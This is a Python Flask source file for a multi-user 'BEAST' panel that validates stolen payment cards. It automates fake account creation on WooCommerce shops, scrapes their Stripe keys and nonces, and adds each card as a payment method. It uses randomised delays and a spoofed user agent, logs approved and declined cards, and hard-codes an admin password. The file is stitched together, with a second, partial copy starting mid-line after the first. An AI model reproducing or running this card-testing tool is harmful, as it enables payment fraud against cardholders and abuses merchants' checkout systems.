# ============================================
# COMPLETE FIXED CODE - app.py
# COPY-PASTE THIS ENTIRELY
# ============================================

from flask import Flask, request, jsonify, render_template, session, redirect, url_for
import requests
import json
import re
import time
import random
import os
import sqlite3
import hashlib
from datetime import datetime
from functools import wraps
from faker import Faker

app = Flask(__name__)
app.secret_key = 'beast_auto_stripe_secret_key_2024'
faker = Faker()

# ============================================
# DATABASE SETUP
# ============================================

def init_db():
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT,
        telegram_id TEXT,
        telegram_name TEXT,
        role TEXT DEFAULT 'user',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        last_login TIMESTAMP
    )''')
    
    # Sites table
    c.execute('''CREATE TABLE IF NOT EXISTS sites (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        url TEXT UNIQUE,
        name TEXT,
        user_id INTEGER,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    
    # Check logs table
    c.execute('''CREATE TABLE IF NOT EXISTS check_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        site TEXT,
        card TEXT,
        status TEXT,
        response TEXT,
        checked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    
    # Insert default admin
    admin_pass = hashlib.sha256('BEASTVIP'.encode()).hexdigest()
    c.execute('SELECT * FROM users WHERE username = ?', ('admin',))
    if not c.fetchone():
        c.execute('INSERT INTO users (username, password, role) VALUES (?, ?, ?)',
                  ('admin', admin_pass, 'admin'))
    
    conn.commit()
    conn.close()

init_db()

# ============================================
# AUTH DECORATORS
# ============================================

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return jsonify({'error': 'Login required'}), 401
        return f(*args, **kwargs)
    return decorated_function

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return jsonify({'error': 'Login required'}), 401
        if session.get('role') != 'admin':
            return jsonify({'error': 'Admin access required'}), 403
        return f(*args, **kwargs)
    return decorated_function

# ============================================
# STRIPE CHECKER FUNCTION (FAST)
# ============================================

def check_single_card(card, site, user_id=None, username=None):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'card': card, 'status': 'Error', 'response': 'Invalid format'}
        card_num, card_mm, card_yy, card_cvv = parts[0].strip(), parts[1].strip(), parts[2].strip()[-2:], parts[3].strip()
    except:
        return {'card': card, 'status': 'Error', 'response': 'Invalid format'}
    
    base_url = f'https://{site}' if not site.startswith('http') else site
    session_obj = requests.Session()
    user_agent = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36'
    
    try:
        # Request 1 - Get nonce
        resp1 = session_obj.get(f'{base_url}/my-account/', headers={'User-Agent': user_agent}, timeout=15)
        nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', resp1.text)
        regester_nonce = nonce_match.group(1) if nonce_match else ""
        time.sleep(random.uniform(0.3, 0.8))
        
        # Request 2 - Register
        random_email = faker.email()
        session_obj.post(f'{base_url}/my-account/', 
                        data={'email': random_email, 'username': random_email.split('@')[0], 
                              'password': faker.password(length=10), 'woocommerce-register-nonce': regester_nonce, 
                              'register': 'Register'},
                        headers={'User-Agent': user_agent}, timeout=15)
        time.sleep(random.uniform(0.3, 0.8))
        
        # Request 3 - Get Stripe keys
        resp3 = session_obj.get(f'{base_url}/my-account/add-payment-method/', headers={'User-Agent': user_agent}, timeout=15)
        
        ajax_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', resp3.text)
        if not ajax_nonce_match:
            ajax_nonce_match = re.search(r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']', resp3.text)
        ajax_nonce = ajax_nonce_match.group(1) if ajax_nonce_match else None
        
        pk_match = re.search(r'"key":"(pk_[^"]+)"', resp3.text)
        if not pk_match:
            pk_match = re.search(r"'key'\s*:\s*'(pk_[^']+)'", resp3.text)
        pk = pk_match.group(1) if pk_match else None
        
        if not ajax_nonce or not pk:
            return {'card': card, 'status': 'Error', 'response': 'Stripe not found'}
        time.sleep(random.uniform(0.3, 0.8))
        
        # Request 4 - Stripe API
        resp4 = session_obj.post('https://api.stripe.com/v1/payment_methods',
                                data={'type': 'card', 'card[number]': card_num, 'card[cvc]': card_cvv,
                                      'card[exp_year]': card_yy, 'card[exp_month]': card_mm,
                                      'key': pk},
                                headers={'User-Agent': user_agent, 'Content-Type': 'application/x-www-form-urlencoded'},
                                timeout=15)
        pm = resp4.json().get('id')
        if not pm:
            return {'card': card, 'status': 'Declined', 'response': 'Card Declined'}
        time.sleep(random.uniform(0.3, 0.8))
        
        # Request 5 - Confirm
        resp5 = session_obj.post(f'{base_url}/wp-admin/admin-ajax.php',
                                data={'action': 'wc_stripe_create_and_confirm_setup_intent',
                                      'wc-stripe-payment-method': pm, 'wc-stripe-payment-type': 'card',
                                      '_ajax_nonce': ajax_nonce},
                                headers={'User-Agent': user_agent, 'X-Requested-With': 'XMLHttpRequest'},
                                timeout=15)
        
        resp_text = resp5.text.lower()
        if 'approved' in resp_text or 'success' in resp_text or 'payment method added' in resp_text:
            status, message = 'Approved', 'Payment Method Added'
        elif 'declined' in resp_text or 'fail' in resp_text:
            status, message = 'Declined', 'Card Declined'
        elif 'requires_action' in resp_text or '3ds' in resp_text:
            status, message = 'Declined', '3DS Required'
        else:
            status, message = 'Declined', 'Card Declined'
        
        # Save log
        conn = sqlite3.connect('beast_panel.db')
        c = conn.cursor()
        c.execute('INSERT INTO check_logs (user_id, username, site, card, status, response) VALUES (?, ?, ?, ?, ?, ?)',
                  (user_id, username, site, card, status, message))
        conn.commit()
        conn.close()
        
        return {'card': card, 'status': status, 'response': message}
        
    except Exception as e:
        return {'card': card, 'status': 'Error', 'response': str(e)[:50]}

# ============================================
# WEB ROUTES
# ============================================

@app.route('/')
def index():
    if 'user_id' in session:
        if session.get('role') == 'admin':
            return redirect(url_for('admin_panel'))
        return redirect(url_for('user_panel'))
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Invalid request'}), 400
    
    username = data.get('username')
    password = data.get('password')
    telegram_id = data.get('telegram_id')
    telegram_name = data.get('telegram_name')
    
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    
    # Telegram login
    if telegram_id:
        c.execute('SELECT * FROM users WHERE telegram_id = ?', (telegram_id,))
        user = c.fetchone()
        if not user:
            c.execute('INSERT INTO users (telegram_id, telegram_name, role) VALUES (?, ?, ?)',
                      (telegram_id, telegram_name, 'user'))
            conn.commit()
            c.execute('SELECT * FROM users WHERE telegram_id = ?', (telegram_id,))
            user = c.fetchone()
        
        session['user_id'] = user[0]
        session['username'] = user[1] or telegram_name
        session['role'] = user[5]
        c.execute('UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?', (user[0],))
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'role': session['role']})
    
    # Manual login
    if username and password:
        hashed_pass = hashlib.sha256(password.encode()).hexdigest()
        c.execute('SELECT * FROM users WHERE username = ? AND password = ?', (username, hashed_pass))
        user = c.fetchone()
        if user:
            session['user_id'] = user[0]
            session['username'] = user[1]
            session['role'] = user[5]
            c.execute('UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?', (user[0],))
            conn.commit()
            conn.close()
            return jsonify({'success': True, 'role': session['role']})
    
    conn.close()
    return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    if not username or not password:
        return jsonify({'error': 'Username and password required'}), 400
    
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    
    c.execute('SELECT * FROM users WHERE username = ?', (username,))
    if c.fetchone():
        conn.close()
        return jsonify({'error': 'Username exists'}), 400
    
    hashed_pass = hashlib.sha256(password.encode()).hexdigest()
    c.execute('INSERT INTO users (username, password, role) VALUES (?, ?, ?)',
              (username, hashed_pass, 'user'))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/admin')
@admin_required
def admin_panel():
    return render_template('admin.html', username=session.get('username'))

@app.route('/user')
@login_required
def user_panel():
    if session.get('role') == 'admin':
        return redirect(url_for('admin_panel'))
    return render_template('user.html', username=session.get('username'))

# ============================================
# API ROUTES - FIXED (Instant response)
# ============================================

@app.route('/api/sites', methods=['GET'])
@login_required
def get_sites():
    user_id = session.get('user_id')
    role = session.get('role')
    
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    
    if role == 'admin':
        c.execute('SELECT id, url, name, user_id, created_at FROM sites ORDER BY created_at DESC')
    else:
        c.execute('SELECT id, url, name, user_id, created_at FROM sites WHERE user_id = ? OR user_id IS NULL ORDER BY created_at DESC', (user_id,))
    
    sites = [{'id': row[0], 'url': row[1], 'name': row[2], 'user_id': row[3], 'created_at': row[4]} for row in c.fetchall()]
    conn.close()
    return jsonify({'sites': sites})

@app.route('/api/sites', methods=['POST'])
@login_required
def add_site():
    data = request.get_json()
    url = data.get('url')
    name = data.get('name', url)
    user_id = session.get('user_id')
    
    if not url:
        return jsonify({'error': 'URL required'}), 400
    
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    try:
        c.execute('INSERT INTO sites (url, name, user_id) VALUES (?, ?, ?)', (url, name, user_id))
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'message': 'Site added instantly'})
    except sqlite3.IntegrityError:
        conn.close()
        return jsonify({'error': 'Site already exists'}), 400

@app.route('/api/sites/<int:site_id>', methods=['DELETE'])
@login_required
def delete_site(site_id):
    user_id = session.get('user_id')
    role = session.get('role')
    
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    
    if role == 'admin':
        c.execute('DELETE FROM sites WHERE id = ?', (site_id,))
    else:
        c.execute('DELETE FROM sites WHERE id = ? AND user_id = ?', (site_id, user_id))
    
    conn.commit()
    conn.close()
    return jsonify({'success': True})

@app.route('/api/check', methods=['POST'])
@login_required
def api_check():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data received'}), 400
        
        site = data.get('site')
        cards = data.get('cards', [])
        card_text = data.get('card_text', '')
        
        if not site:
            return jsonify({'error': 'Site required'}), 400
        
        if card_text:
            lines = card_text.strip().split('\n')
            for line in lines:
                line = line.strip()
                if line and '|' in line:
                    cards.append(line)
        
        if not cards:
            return jsonify({'error': 'No valid cards provided'}), 400
        
        user_id = session.get('user_id')
        username = session.get('username')
        
        results = []
        for card in cards:
            result = check_single_card(card, site, user_id, username)
            results.append(result)
        
        return jsonify({'results': results, 'total': len(results)})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/logs', methods=['GET'])
@login_required
def get_logs():
    user_id = session.get('user_id')
    role = session.get('role')
    
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    
    if role == 'admin':
        c.execute('SELECT id, username, site, card, status, response, checked_at FROM check_logs ORDER BY checked_at DESC LIMIT 100')
    else:
        c.execute('SELECT id, username, site, card, status, response, checked_at FROM check_logs WHERE user_id = ? ORDER BY checked_at DESC LIMIT 50', (user_id,))
    
    logs = [{'id': row[0], 'username': row[1], 'site': row[2], 'card': row[3][:10]+'***', 
             'status': row[4], 'response': row[5], 'checked_at': row[6]} for row in c.fetchall()]
    conn.close()
    return jsonify({'logs': logs})

@app.route('/api/stats', methods=['GET'])
@login_required
def get_stats():
    user_id = session.get('user_id')
    role = session.get('role')
    
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    
    if role == 'admin':
        c.execute('SELECT COUNT(*) FROM users')
        total_users = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM check_logs')
        total_checks = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM check_logs WHERE status = "Approved"')
        approved = c.fetchone()[0]
    else:
        c.execute('SELECT COUNT(*) FROM check_logs WHERE user_id = ?', (user_id,))
        total_checks = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM check_logs WHERE user_id = ? AND status = "Approved"', (user_id,))
        approved = c.fetchone()[0]
        total_users = 0
    
    conn.close()
    return jsonify({
        'total_users': total_users,
        'total_checks': total_checks,
        'approved': approved,
        'declined': total_checks - approved
    })

@app.route('/api/admin/users', methods=['GET'])
@admin_required
def admin_get_users():
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    c.execute('SELECT id, username, telegram_id, telegram_name, role, created_at, last_login FROM users ORDER BY created_at DESC')
    users = [{'id': row[0], 'username': row[1], 'telegram_id': row[2], 'telegram_name': row[3],
              'role': row[4], 'created_at': row[5], 'last_login': row[6]} for row in c.fetchall()]
    conn.close()
    return jsonify({'users': users})

@app.route('/api/admin/users/<int:user_id>/role', methods=['PUT'])
@admin_required
def admin_update_role(user_id):
    data = request.get_json()
    role = data.get('role')
    
    if role not in ['user', 'admin']:
        return jsonify({'error': 'Invalid role'}), 400
    
    if user_id == session.get('user_id'):
        return jsonify({'error': 'Cannot change own role'}), 400
    
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    c.execute('UPDATE users SET role = ? WHERE id = ?', (role, user_id))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

@app.route('/api/admin/users/<int:user_id>', methods=['DELETE'])
@admin_required
def admin_delete_user(user_id):
    if user_id == session.get('user_id'):
        return jsonify({'error': 'Cannot delete yourself'}), 400
    
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    c.execute('DELETE FROM users WHERE id = ?', (user_id,))
    c.execute('DELETE FROM check_logs WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

@app.route('/api/admin/sites/all', methods=['GET'])
@admin_required
def admin_get_all_sites():
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    c.execute('SELECT id, url, name, user_id, created_at FROM sites ORDER BY created_at DESC')
    sites = [{'id': row[0], 'url': row[1], 'name': row[2], 'user_id': row[3], 'created_at': row[4]} for row in c.fetchall()]
    conn.close()
    return jsonify({'sites': sites})

# Health check endpoint
@app.route('/health')
def health():
    return jsonify({'status': 'ok', 'message': 'BEAST API is running'})

# ============================================
# RUN SERVER
# ============================================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(debug=False, host='0.0.0.0', port=port)        telegram_name TEXT,
        role TEXT DEFAULT 'user',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        last_login TIMESTAMP
    )''')
    
    # Sites table
    c.execute('''CREATE TABLE IF NOT EXISTS sites (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        url TEXT UNIQUE,
        name TEXT,
        user_id INTEGER,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    
    # Check logs table
    c.execute('''CREATE TABLE IF NOT EXISTS check_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        site TEXT,
        card TEXT,
        status TEXT,
        response TEXT,
        checked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    
    # Insert default admin if not exists
    admin_pass = hashlib.sha256('BEASTVIP'.encode()).hexdigest()
    c.execute('SELECT * FROM users WHERE username = ?', ('admin',))
    if not c.fetchone():
        c.execute('INSERT INTO users (username, password, role) VALUES (?, ?, ?)',
                  ('admin', admin_pass, 'admin'))
    
    conn.commit()
    conn.close()

init_db()

# ============================================
# AUTH DECORATORS
# ============================================

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return jsonify({'error': 'Login required'}), 401
        return f(*args, **kwargs)
    return decorated_function

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return jsonify({'error': 'Login required'}), 401
        if session.get('role') != 'admin':
            return jsonify({'error': 'Admin access required'}), 403
        return f(*args, **kwargs)
    return decorated_function

# ============================================
# STRIPE CHECKER FUNCTION
# ============================================

def auto_request(url, method='GET', headers=None, data=None, params=None, json_data=None, session_obj=None):
    clean_headers = {}
    if headers:
        for key, value in headers.items():
            if key.lower() != 'cookie':
                clean_headers[key] = value
    
    req_session = session_obj if session_obj else requests.Session()
    request_kwargs = {'url': url, 'headers': clean_headers}
    if data: request_kwargs['data'] = data
    if params: request_kwargs['params'] = params
    if json_data: request_kwargs['json'] = json_data
    
    response = req_session.request(method, **request_kwargs)
    response.raise_for_status()
    return response

def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format")
    return parts[0].strip(), parts[1].strip(), parts[2].strip()[-2:], parts[3].strip()

def determine_status(response_text, response_json=None):
    if "requires_action" in response_text.lower() or "3ds" in response_text.lower():
        return "Declined", "3DS Required"
    if response_json and response_json.get("success"):
        return "Approved", "Payment Method Added"
    
    decline_patterns = ['declined', 'decline', 'fail', 'error', 'invalid', 'incorrect']
    for pattern in decline_patterns:
        if pattern in response_text.lower():
            return "Declined", "Card Declined"
    
    approval_patterns = ['approved', 'success', 'successful', 'accepted', 'payment method added']
    for pattern in approval_patterns:
        if pattern in response_text.lower():
            return "Approved", "Payment Method Added"
    
    return "Declined", "Card Declined"

def check_single_card(card, site, user_id=None, username=None):
    try:
        card_num, card_mm, card_yy, card_cvv = parse_cc_string(card)
    except:
        return {'card': card, 'status': 'Error', 'response': 'Invalid format'}
    
    base_url = f'https://{site}' if not site.startswith('http') else site
    session_obj = requests.Session()
    user_agent = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36'
    key = 'Beast'
    
    # Request 1 - Get nonce
    try:
        response_1 = auto_request(f'{base_url}/my-account/', method='GET', 
                                  headers={'User-Agent': user_agent}, session_obj=session_obj)
        nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response_1.text)
        regester_nonce = nonce_match.group(1) if nonce_match else ""
        time.sleep(random.uniform(0.5, 1.0))
    except:
        return {'card': card, 'status': 'Error', 'response': 'Site unreachable'}
    
    # Request 2 - Register
    random_email = faker.email()
    try:
        auto_request(f'{base_url}/my-account/', method='POST',
                    headers={'User-Agent': user_agent, 'Content-Type': 'application/x-www-form-urlencoded'},
                    data={'email': random_email, 'username': random_email.split('@')[0], 
                          'password': faker.password(length=12), 'woocommerce-register-nonce': regester_nonce, 
                          'register': 'Register'},
                    session_obj=session_obj)
        time.sleep(random.uniform(0.5, 1.0))
    except:
        pass
    
    # Request 3 - Get Stripe keys
    try:
        response_3 = auto_request(f'{base_url}/my-account/add-payment-method/', method='GET',
                                  headers={'User-Agent': user_agent}, session_obj=session_obj)
        
        ajax_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response_3.text)
        if not ajax_nonce_match:
            ajax_nonce_match = re.search(r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']', response_3.text)
        ajax_nonce = ajax_nonce_match.group(1) if ajax_nonce_match else None
        
        pk_match = re.search(r'"key":"(pk_[^"]+)"', response_3.text)
        if not pk_match:
            pk_match = re.search(r"'key'\s*:\s*'(pk_[^']+)'", response_3.text)
        pk = pk_match.group(1) if pk_match else None
        
        if not ajax_nonce or not pk:
            return {'card': card, 'status': 'Error', 'response': 'Stripe not found'}
        time.sleep(random.uniform(0.5, 1.0))
    except:
        return {'card': card, 'status': 'Error', 'response': 'Payment page failed'}
    
    # Request 4 - Stripe API
    try:
        response_4 = auto_request('https://api.stripe.com/v1/payment_methods', method='POST',
                                  headers={'User-Agent': user_agent, 'Content-Type': 'application/x-www-form-urlencoded'},
                                  data={'type': 'card', 'card[number]': card_num, 'card[cvc]': card_cvv,
                                        'card[exp_year]': card_yy, 'card[exp_month]': card_mm,
                                        'guid': f'guid_{key.lower()}', 'muid': f'muid_{key.lower()}', 
                                        'sid': f'sid_{key.lower()}', 'key': pk},
                                  session_obj=session_obj)
        pm = response_4.json().get('id')
        if not pm:
            return {'card': card, 'status': 'Declined', 'response': 'Card Declined'}
        time.sleep(random.uniform(0.5, 1.0))
    except:
        return {'card': card, 'status': 'Declined', 'response': 'Card Declined'}
    
    # Request 5 - Confirm
    try:
        response_5 = auto_request(f'{base_url}/wp-admin/admin-ajax.php', method='POST',
                                  headers={'User-Agent': user_agent, 'X-Requested-With': 'XMLHttpRequest',
                                          'Content-Type': 'application/x-www-form-urlencoded'},
                                  data={'action': 'wc_stripe_create_and_confirm_setup_intent',
                                        'wc-stripe-payment-method': pm, 'wc-stripe-payment-type': 'card',
                                        '_ajax_nonce': ajax_nonce},
                                  session_obj=session_obj)
        status, message = determine_status(response_5.text)
        
        # Save to log
        conn = sqlite3.connect('beast_panel.db')
        c = conn.cursor()
        c.execute('INSERT INTO check_logs (user_id, username, site, card, status, response) VALUES (?, ?, ?, ?, ?, ?)',
                  (user_id, username, site, card, status, message))
        conn.commit()
        conn.close()
        
        return {'card': card, 'status': status, 'response': message}
    except:
        return {'card': card, 'status': 'Error', 'response': 'Check failed'}

# ============================================
# WEB ROUTES
# ============================================

@app.route('/')
def index():
    if 'user_id' in session:
        if session.get('role') == 'admin':
            return redirect(url_for('admin_panel'))
        return redirect(url_for('user_panel'))
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    telegram_id = data.get('telegram_id')
    telegram_name = data.get('telegram_name')
    
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    
    # Telegram login
    if telegram_id:
        c.execute('SELECT * FROM users WHERE telegram_id = ?', (telegram_id,))
        user = c.fetchone()
        
        if not user:
            # Auto register new user via Telegram
            c.execute('INSERT INTO users (telegram_id, telegram_name, role) VALUES (?, ?, ?)',
                      (telegram_id, telegram_name, 'user'))
            conn.commit()
            c.execute('SELECT * FROM users WHERE telegram_id = ?', (telegram_id,))
            user = c.fetchone()
        
        session['user_id'] = user[0]
        session['username'] = user[1] or telegram_name
        session['role'] = user[5]
        
        c.execute('UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?', (user[0],))
        conn.commit()
        conn.close()
        
        return jsonify({'success': True, 'role': session['role']})
    
    # Manual login
    if username and password:
        hashed_pass = hashlib.sha256(password.encode()).hexdigest()
        c.execute('SELECT * FROM users WHERE username = ? AND password = ?', (username, hashed_pass))
        user = c.fetchone()
        
        if user:
            session['user_id'] = user[0]
            session['username'] = user[1]
            session['role'] = user[5]
            
            c.execute('UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?', (user[0],))
            conn.commit()
            conn.close()
            
            return jsonify({'success': True, 'role': session['role']})
    
    conn.close()
    return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    if not username or not password:
        return jsonify({'error': 'Username and password required'}), 400
    
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    
    c.execute('SELECT * FROM users WHERE username = ?', (username,))
    if c.fetchone():
        conn.close()
        return jsonify({'error': 'Username already exists'}), 400
    
    hashed_pass = hashlib.sha256(password.encode()).hexdigest()
    c.execute('INSERT INTO users (username, password, role) VALUES (?, ?, ?)',
              (username, hashed_pass, 'user'))
    conn.commit()
    conn.close()
    
    return jsonify({'success': True})

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/admin')
@admin_required
def admin_panel():
    return render_template('admin.html', username=session.get('username'))

@app.route('/user')
@login_required
def user_panel():
    if session.get('role') == 'admin':
        return redirect(url_for('admin_panel'))
    return render_template('user.html', username=session.get('username'))

# ============================================
# API ROUTES - COMMON
# ============================================

@app.route('/api/sites', methods=['GET'])
@login_required
def get_sites():
    user_id = session.get('user_id')
    role = session.get('role')
    
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    
    if role == 'admin':
        c.execute('SELECT id, url, name, user_id, created_at FROM sites ORDER BY created_at DESC')
    else:
        c.execute('SELECT id, url, name, user_id, created_at FROM sites WHERE user_id = ? OR user_id IS NULL ORDER BY created_at DESC', (user_id,))
    
    sites = [{'id': row[0], 'url': row[1], 'name': row[2], 'user_id': row[3], 'created_at': row[4]} for row in c.fetchall()]
    conn.close()
    return jsonify({'sites': sites})

@app.route('/api/sites', methods=['POST'])
@login_required
def add_site():
    data = request.get_json()
    url = data.get('url')
    name = data.get('name', url)
    user_id = session.get('user_id')
    
    if not url:
        return jsonify({'error': 'URL required'}), 400
    
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    try:
        c.execute('INSERT INTO sites (url, name, user_id) VALUES (?, ?, ?)', (url, name, user_id))
        conn.commit()
        return jsonify({'success': True})
    except sqlite3.IntegrityError:
        return jsonify({'error': 'Site already exists'}), 400
    finally:
        conn.close()

@app.route('/api/sites/<int:site_id>', methods=['DELETE'])
@login_required
def delete_site(site_id):
    user_id = session.get('user_id')
    role = session.get('role')
    
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    
    if role == 'admin':
        c.execute('DELETE FROM sites WHERE id = ?', (site_id,))
    else:
        c.execute('DELETE FROM sites WHERE id = ? AND user_id = ?', (site_id, user_id))
    
    conn.commit()
    conn.close()
    return jsonify({'success': True})

@app.route('/api/check', methods=['POST'])
@login_required
def api_check():
    data = request.get_json()
    site = data.get('site')
    cards = data.get('cards', [])
    card_text = data.get('card_text', '')
    
    if not site:
        return jsonify({'error': 'Site required'}), 400
    
    if card_text:
        lines = card_text.strip().split('\n')
        for line in lines:
            line = line.strip()
            if line and '|' in line:
                cards.append(line)
    
    if not cards:
        return jsonify({'error': 'No cards provided'}), 400
    
    user_id = session.get('user_id')
    username = session.get('username')
    
    results = []
    for card in cards:
        result = check_single_card(card, site, user_id, username)
        results.append(result)
    
    return jsonify({'results': results})

@app.route('/api/logs', methods=['GET'])
@login_required
def get_logs():
    user_id = session.get('user_id')
    role = session.get('role')
    
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    
    if role == 'admin':
        c.execute('SELECT id, username, site, card, status, response, checked_at FROM check_logs ORDER BY checked_at DESC LIMIT 200')
    else:
        c.execute('SELECT id, username, site, card, status, response, checked_at FROM check_logs WHERE user_id = ? ORDER BY checked_at DESC LIMIT 100', (user_id,))
    
    logs = [{'id': row[0], 'username': row[1], 'site': row[2], 'card': row[3][:10]+'***', 
             'status': row[4], 'response': row[5], 'checked_at': row[6]} for row in c.fetchall()]
    conn.close()
    return jsonify({'logs': logs})

@app.route('/api/stats', methods=['GET'])
@login_required
def get_stats():
    user_id = session.get('user_id')
    role = session.get('role')
    
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    
    if role == 'admin':
        c.execute('SELECT COUNT(*) FROM users')
        total_users = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM check_logs')
        total_checks = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM check_logs WHERE status = "Approved"')
        approved = c.fetchone()[0]
    else:
        c.execute('SELECT COUNT(*) FROM check_logs WHERE user_id = ?', (user_id,))
        total_checks = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM check_logs WHERE user_id = ? AND status = "Approved"', (user_id,))
        approved = c.fetchone()[0]
        total_users = 0
    
    conn.close()
    
    return jsonify({
        'total_users': total_users,
        'total_checks': total_checks,
        'approved': approved,
        'declined': total_checks - approved
    })

# ============================================
# ADMIN ONLY APIs
# ============================================

@app.route('/api/admin/users', methods=['GET'])
@admin_required
def admin_get_users():
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    c.execute('SELECT id, username, telegram_id, telegram_name, role, created_at, last_login FROM users ORDER BY created_at DESC')
    users = [{'id': row[0], 'username': row[1], 'telegram_id': row[2], 'telegram_name': row[3],
              'role': row[4], 'created_at': row[5], 'last_login': row[6]} for row in c.fetchall()]
    conn.close()
    return jsonify({'users': users})

@app.route('/api/admin/users/<int:user_id>/role', methods=['PUT'])
@admin_required
def admin_update_role(user_id):
    data = request.get_json()
    role = data.get('role')
    
    if role not in ['user', 'admin']:
        return jsonify({'error': 'Invalid role'}), 400
    
    # Don't allow changing own role
    if user_id == session.get('user_id'):
        return jsonify({'error': 'Cannot change your own role'}), 400
    
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    c.execute('UPDATE users SET role = ? WHERE id = ?', (role, user_id))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

@app.route('/api/admin/users/<int:user_id>', methods=['DELETE'])
@admin_required
def admin_delete_user(user_id):
    if user_id == session.get('user_id'):
        return jsonify({'error': 'Cannot delete yourself'}), 400
    
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    c.execute('DELETE FROM users WHERE id = ?', (user_id,))
    c.execute('DELETE FROM check_logs WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

@app.route('/api/admin/sites/all', methods=['GET'])
@admin_required
def admin_get_all_sites():
    conn = sqlite3.connect('beast_panel.db')
    c = conn.cursor()
    c.execute('SELECT id, url, name, user_id, created_at FROM sites ORDER BY created_at DESC')
    sites = [{'id': row[0], 'url': row[1], 'name': row[2], 'user_id': row[3], 'created_at': row[4]} for row in c.fetchall()]
    conn.close()
    return jsonify({'sites': sites})

# ============================================
# RUN SERVER
# ============================================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(debug=False, host='0.0.0.0', port=port)
